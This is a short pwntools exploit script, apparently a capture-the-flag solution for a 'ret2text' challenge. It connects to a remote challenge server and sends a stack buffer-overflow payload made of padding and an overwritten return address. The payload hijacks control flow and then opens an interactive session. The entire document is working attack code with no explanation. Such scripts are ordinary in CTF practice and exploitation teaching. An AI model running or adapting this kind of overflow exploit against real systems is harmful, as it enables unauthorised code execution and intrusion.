from pwn import *

# p = process("./ret2text")
p = remote("node4.anna.nssctf.cn",28559)

ret = 0x400834
payload = b"a"*0x18 + p64(0x4005B6)  

#p.sendlineafter("Please input the length of your name:\n",str(100))
#p.sendlineafter("[+]What's u name?\n",payload)
p.sendline(payload)

p.interactive()